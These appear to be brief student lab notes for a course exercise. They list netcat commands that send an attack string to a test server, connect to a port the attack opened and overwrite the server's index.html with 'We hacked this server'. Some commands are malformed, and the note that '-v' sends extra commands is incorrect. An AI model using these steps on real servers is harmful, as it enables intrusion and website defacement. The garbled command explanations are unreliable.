Sequence of commands to run:

1) echo -e "GET <attack string> HTTP" | nc 9218

2) to connect to port 5050 after opening it (open another tab in termial)
and to also send in the string that replaces the content of index.html in the remote server:

nc -v 310test.cs.duke.edu 5050 cd www echo "We hacked this server" > index.html


-v lets you send in additional command to change the file index.html in the remote server
